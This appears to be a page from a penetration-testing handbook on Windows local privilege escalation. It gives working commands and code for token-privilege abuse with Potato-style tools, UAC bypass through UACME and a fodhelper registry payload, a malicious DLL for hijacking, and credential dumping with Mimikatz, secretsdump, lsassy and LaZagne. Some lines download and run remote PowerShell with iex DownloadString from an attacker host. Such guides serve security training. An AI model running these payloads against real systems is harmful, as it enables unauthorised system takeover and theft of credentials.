---
description: Escalate privileges on a local computer to become a more powerful user
---

# Local Privilege Escalation

After the [local-enumeration.md](local-enumeration.md "mention") phase, you might have found some interesting things. This section explains how you exploit some findings to reach the Administrator on the current (local) computer.

Once this is successful, you should have enough permissions to do anything on the machine. The main goal is often using [#post-exploitation-mimikatz](local-privilege-escalation.md#post-exploitation-mimikatz "mention") to read cached credentials from a memory dump of the `LSASS.exe` process.

## Credentials

Many times the enumeration efforts result in some new credentials being found. See[#spray-passwords](scanning-spraying.md#spray-passwords "mention") for tools that can spray credentials over systems quickly, to find which computer or user they belong to.

You can also start a local process as another user from CMD/PowerShell using the `runas` command. This will start a new window as that user after filling in the correct password:

{% code title="sudo interactively" %}
```powershell
runas /user:j0r1an powershell  # local
runas /user:corp\j0r1an powershell  # domain
```
{% endcode %}

The above only works in an RDP setting where you interactively type the password. For shells instead, you can use PowerShell to create a new process with your credentials:

<pre class="language-powershell" data-title="sudo using PowerShell" data-overflow="wrap"><code class="lang-powershell"><strong>$pass = ConvertTo-SecureString '$PASSWORD' -AsPlainText -Force
</strong># 1. Local account
<strong>$c = New-Object System.Management.Automation.PSCredential("$USERNAME", $pass)
</strong># 2. Domain account
<strong>$c = New-Object System.Management.Automation.PSCredential("$DOMAIN\$USERNAME", $pass)
</strong>
<strong>Start-Process -Credential ($c) -NoNewWindow powershell "iex (New-Object Net.WebClient).DownloadString('http://$IP:8000/shell.ps1')"  # Run your payload here
</strong></code></pre>

## Privileges

Windows uses 'privileges' to determine what you can and can't do. There are some uninteresting default privileges, but also some that give a lot of power. Check them with the `whoami` command:

<pre class="language-powershell"><code class="lang-powershell"><strong>PS C:\> whoami /priv
</strong>
Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
</code></pre>

From these the `SeShutdownPrivilege` is a little interesting, as it allows you to reboot the machine. Some exploits only trigger at the startup of a service for example, and a reboot can trigger this at will.&#x20;

Local administrators will have all the permissions that exist, so they can do anything on the computer. Sometimes a middle ground is chosen to give low-privilege users some extra privilege, but this can backfire if they are powerful ones that can be abused.&#x20;

### SeImpersonatePrivilege

This privilege allows you to impersonate other users like `nt authority\system`. This user can do anything, like dumping LSASS memory with Mimikatz. Exploits exist that abuse this to get a shell:

[https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe](https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe)

<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell">PS C:\> .\PrintSpoofer64.exe -i -c powershell.exe
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

<strong>PS C:\Windows\system32> whoami
</strong>whoami
<strong>nt authority\system
</strong></code></pre>

It's possible that this exploit above does not work, but some alternatives might work in these scenarios. First, there is [GodPotato](https://github.com/BeichenDream/GodPotato/releases) which you can download pre-compiled from the Releases, and execute:

```powershell
.\GodPotato-NET4.exe -cmd ".\shell.exe"
```

Lastly, there is also [SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato) which needs to be compiled by hand using [Visual Studio](https://visualstudio.microsoft.com/):

```powershell
.\SharpEfsPotato.exe -p C:\Windows\Tasks\shell.exe
```

### Other Se...Privilege

{% embed url="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens" %}
Comprehensive list of abusable privileges to perform local privilege escalation
{% endembed %}

### 'Disabled' privileges

In rare cases, privileges might be _Disabled_ which doesn't let you abuse them. Luckily for the attacker, this is only a setting that you can easily Enable for any privilege. The [EnableAllTokenPrivs.ps1](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/) script can be used to enable all these privileges:

<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell"><strong>PS C:\> whoami /priv  # Some privileges are disabled
</strong>
Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled

<strong>PS C:\> IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1');
</strong>
<strong>PS C:\> whoami /priv  # Now everything is enabled
</strong>
Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Enabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled
</code></pre>

## UAC Bypass

Using `whoami /groups` you can find if your user is in the `BUILTIN\Administrators` group, and if they are, you should be able to reach the `Mandatory Label\High`, which might be at `Mandatory Label\Medium` right now.&#x20;

<pre><code><strong>PS C:\> whoami /groups
</strong>
GROUP INFORMATION
-----------------

Group Name                             Type             SID                                            Attributes
====================================== ================ ============================================== ==================================================
Everyone                               Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
<strong>BUILTIN\Administrators                 Alias            S-1-5-32-544                                   Mandatory group, Enabled by default, Enabled group
</strong>BUILTIN\Remote Desktop Users           Alias            S-1-5-32-555                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\BATCH                     Well-known group S-1-5-3                                        Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                          Well-known group S-1-2-1                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113                                      Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
<strong>Mandatory Label\Medium Mandatory Level Label            S-1-16-8192
</strong></code></pre>

An Administrator should be able to start a `Mandatory Label\High` process, but this usually involves a user pressing "Yes" on a GUI prompt, this is the User Account Control (UAC) at work.&#x20;

This feature is however bypassable without a GUI using AutoElevate programs. To check if a binary has the AutoElevate property, we can use [sigcheck](https://learn.microsoft.com/en-us/sysinternals/downloads/sigcheck):

<pre class="language-powershell"><code class="lang-powershell"><strong>C:\> sigcheck -m c:/windows/system32/msconfig.exe
</strong>...
&#x3C;asmv3:application>
	&#x3C;asmv3:windowsSettings xmlns="http://schemas.microsoft.com/SMI/2005/WindowsSettings">
		&#x3C;dpiAware>true&#x3C;/dpiAware>
<strong>		&#x3C;autoElevate>true&#x3C;/autoElevate>
</strong>	&#x3C;/asmv3:windowsSettings>
&#x3C;/asmv3:application>
</code></pre>

Many different built-in programs have this property set, but not all are secure. Microsoft seems to not classify UAC bypasses as an issue, so this repository collects dozens of working methods:

{% embed url="https://github.com/hfiref0x/UACME" %}
Collection of UAC bypass techniques abusing builtin Windows programs
{% endembed %}

To build the tool, open the **Source** folder in [Visual Studio](https://visualstudio.microsoft.com/). This should open the "Akagi" project which you can build in Release mode for x64 architecture:

<figure><img src="../.gitbook/assets/image-removebg-preview (4).png" alt="" width="294"><figcaption><p>Select <strong>Release</strong> and <strong>x64</strong> in the dropdowns, and then <strong>Build</strong> -> <strong>Build Solution</strong></p></figcaption></figure>

When building is done, you should find the compiled binary in "Source\Akagi\output\x64\Release\Akagi64.exe".&#x20;

This can now be executed on the target by _choosing a technique_, and a program to start in a new window with the elevated privileges:

```powershell
.\Akagi64.exe 61 powershell.exe
```

<pre class="language-powershell" data-title="New powershell.exe"><code class="lang-powershell"><strong>PS C:\> whoami /groups
</strong>...
<strong>Mandatory Label\High Mandatory Level   Label            S-1-16-12288
</strong></code></pre>

<details>

<summary>Manual fodhelper.exe Payload</summary>

```powershell
$key = "HKCU\Software\Classes\ms-settings\Shell\Open\command"
cmd /c "reg add $key /v `"DelegateExecute`" /d `"`" /f"
cmd /c "reg add $key /d `"C:\Windows\Tasks\payload.exe`" /f"

fodhelper.exe
sleep 1
reg delete $key /f
```

</details>

## DLL Hijacking

Programs in Windows have assembled code that they execute, but also often load libraries and call their code to prevent having every program include some basic functionality. Which libraries to load can be completely decided by the program, and they can even make their own custom libraries (DLLs). When the program is started, directories are **searched** for the library names in the **following order**:

1. Directory containing the `.exe` that started
2. `C:\Windows\System32`
3. `C:\Windows\System`
4. `C:\Windows`
5. Current working directory
6. Any directories in the _system_ `$env:path` environment variable
7. Any directories in the _user_ `$env:path` environment variable

While 2-5 are often pretty locked, the 6 and 7 variables might contain some interesting directories that you may write in. Check their paths in PowerShell like so:

<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell"><strong>PS C:\> [Environment]::GetEnvironmentVariable("Path", "User")
</strong>C:\Users\$USERNAME\AppData\Local\Microsoft\WindowsApps;
<strong>PS C:\> [Environment]::GetEnvironmentVariable("Path", "Machine")
</strong>C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\
</code></pre>

Perhaps the most interesting of all of these is 1, the directory containing the executable. If we as the attacker can write in this directory, and the executable is run in a higher-privileged context, we can overwrite an existing DLL to run whatever we want. Check permissions using `icacls` or just try writing there with a simple `echo a > a`.

When having confirmed that a writable searched directory exists, we need to find what DLLs are loaded by the executable. A very unscientific way of doing this is simply searching for `.dll` names in the program binary after transferring it over to your Linux machine:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ grep -Eao '\w+\.dll' Program.exe | sort -u
</strong>0.dll
<strong>MyLibrary.dll
</strong>VCRUNTIME140.dll
advapi32.dll
dbghelp.dll
kernel32.dll
</code></pre>

Any of these will probably work, but `MyLibrary.dll` seems custom and most likely, so we'll focus on that. To find out what libraries are actually loaded we can dynamically analyze it by running it locally and attaching [Process Monitor](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon), then looking for _CreateFile_ events with `.dll` extensions:

<figure><img src="../.gitbook/assets/image (45).png" alt="" width="520"><figcaption></figcaption></figure>

Now that we have found a potential place and name for a DLL that we can overwrite, we have to create a malicious DLL that runs what we want, like a reverse shell also stored on the system. We just need to define the special `DllMain()` function and handle the different cases:

<pre class="language-cpp" data-title="MyLibrary.dll"><code class="lang-cpp">#include &#x3C;stdlib.h>
#include &#x3C;stdlib.h>
#include &#x3C;windows.h>

BOOL APIENTRY DllMain(
    HANDLE hModule,           // Handle to DLL module
    DWORD ul_reason_for_call, // Reason for calling function
    LPVOID lpReserved)        // Reserved
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH: // A process is loading the DLL.
<strong>        system("C:\\Windows\\Tasks\\shell.exe");
</strong>        break;
    case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
    case DLL_THREAD_DETACH: // A thread exits normally.
        break;
    case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
</code></pre>

Then we can compile this code locally from a Linux machine by using the `mingw` compiler, to create a `.dll` shared library. This can be moved over to the vulnerable location on the target.

```bash
x86_64-w64-mingw32-gcc MyLibrary.cpp --shared -o MyLibrary.dll
```

## Post-Exploitation: Mimikatz

When having taken over a computer to full Administrator privileges, and the `High` Integrity Level, tools like [`mimikatz.exe`](https://github.com/gentilkiwi/mimikatz/releases) can use these privileges to do a lot of nasty stuff. The tool is a big collection of commands that should be run **on the target** itself as an executable. Its most common use case is extracting in-memory credentials from the computer to use in further attacks, like cracking or passing them.&#x20;

Some commands **require** `privilege::debug` or even `token::elevate` to be run before, to activate the required privileges. Make sure to try these first when you encounter errors.&#x20;

The `sekurlsa::logonpasswords`, `lsadump::lsa` and `lsadump::sam` commands go hand-in-hand, finding different plaintext credentials, NTLM hashes, or Kerberos tickets from logged-on users in memory for the first, and by asking the LSA server for the latter. These are incredibly useful for starting [lateral-movement.md](lateral-movement.md "mention").\
`sekurlsa::tickets` is another such tool that finds active Kerberos tickets to export and import.

The [`sekurlsa::pth`](https://tools.thehacker.recipes/mimikatz/modules/sekurlsa/pth) command stands for "Pass The Hash", allowing you to spawn a process as another user only knowing their NTLM hash.&#x20;

### Remote alternatives

There are some tools that run the techniques Mimikatz uses from a remote perspective, which may be quicker to use. Here are a few of them:

#### [`secretsdump.py`](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)

Remotely dump all kinds of secrets on the target computer, from NTLM hashes to SAM and LSA. While this finds and dumps a lot, it won't find everything (read more in [this article](https://medium.com/@benichmt1/secretsdump-demystified-bfd0f933dd9b)).&#x20;

```bash
python3 secretsdump.py $DOMAIN/$USERNAME:$PASSWORD@$IP
```

#### [`lsassy`](https://github.com/Hackndo/lsassy)

{% embed url="https://en.hackndo.com/remote-lsass-dump-passwords/" %}
Blog post explaining the creation of this tool to remotely dump LSASS credentials
{% endembed %}

{% code title="Example usage" overflow="wrap" %}
```bash
lsassy -u Administrator -H 2ffb2676507e81cb73211213ed643202 -d hackn.lab 10.10.10.0/30 --users
```
{% endcode %}

#### LaZagne

{% embed url="https://github.com/AlessandroZ/LaZagne" %}
Tool to extract all kinds of credentials from popular software like browsers and databases
{% endembed %}

{% code title="Example usage" %}
```
.\LaZagne.exe all
```
{% endcode %}
